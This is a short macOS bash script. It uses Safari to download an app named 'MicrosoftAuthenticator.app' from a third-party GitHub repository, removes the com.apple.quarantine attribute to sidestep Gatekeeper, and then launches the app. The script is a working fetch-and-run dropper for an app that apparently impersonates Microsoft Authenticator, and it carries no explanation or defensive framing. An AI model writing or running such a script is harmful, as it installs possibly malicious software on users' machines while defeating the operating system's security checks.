#!/bin/bash

# URL to open in Safari
url="https://github.com/CYBTWR-TAMUTO/M365DShared/raw/main/MicrosoftAuthenticator.app"

# Create an AppleScript command
applescript_command='tell application "Safari" to open location "'"$url"'"'

# Execute the AppleScript command
osascript -e "$applescript_command"

# Sleep for a moment to allow time for download
sleep 10

# Specify the name of the downloaded application
app_name="MicrosoftAuthenticator.app"

# Specify the full path to the downloaded application
app_path="/Users/luiza/Downloads/$app_name"

# Check if the application exists
if [ -e "$app_path" ]; then
    echo "Downloaded application found."

    # Check extended attributes for MicrosoftAuthenticator.app
    echo "Checking extended attributes for $app_name..."
    xattr_result=$(xattr "$app_path")

    # Check if "com.apple.quarantine" is present in the extended attributes
    if [[ $xattr_result == *"com.apple.quarantine"* ]]; then
        echo "The 'com.apple.quarantine' attribute is present."
        
        # Removing 'com.apple.quarantine' attribute
        echo "Removing 'com.apple.quarantine' attribute..."
        xattr -d com.apple.quarantine "$app_path"
        echo "Attribute removed."
    else
        echo "No 'com.apple.quarantine' attribute found."
    fi

    # Run the application 
    echo "Opening the application..."
    open "$app_path"
else
    echo "Error: Downloaded application not found."
fi
